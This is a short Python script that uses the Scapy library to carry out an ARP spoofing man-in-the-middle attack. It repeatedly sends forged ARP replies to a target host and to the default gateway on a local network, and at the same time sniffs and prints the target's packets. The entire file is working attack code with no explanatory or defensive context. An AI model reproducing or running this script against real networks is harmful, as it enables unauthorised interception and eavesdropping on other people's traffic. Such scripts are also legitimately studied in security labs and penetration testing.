from scapy.all import *
import threading 
import time

conf.checkIPaddr = False

interval = 10
DEFAULT_GATEWAY = "192.168.1.1"
TARGET_IP = "192.168.1.80"

# --------------------------
# LISTEN TO PACKETS
def process_packet(packet):
    if packet.fields["src"] == getmacbyip(TARGET_IP):
        print(packet.summary())

def sniff_packets():
    sniff(iface = "Ethernet", prn = process_packet)
# --------------------------

# --------------------------
# SEND PACKETS
def spoof(target_ip, spoof_ip):
    arp_reply = ARP(op = 2, pdst = target_ip, hwdst = getmacbyip(target_ip), psrc = spoof_ip)
    send(arp_reply, verbose = False)

def send_packets():
    while True:
        spoof(TARGET_IP, DEFAULT_GATEWAY)
        spoof(DEFAULT_GATEWAY, TARGET_IP)
        time.sleep(interval)
# --------------------------

thread1 = threading.Thread(target=sniff_packets)
thread1.start()

thread2 = threading.Thread(target=send_packets)
thread2.start()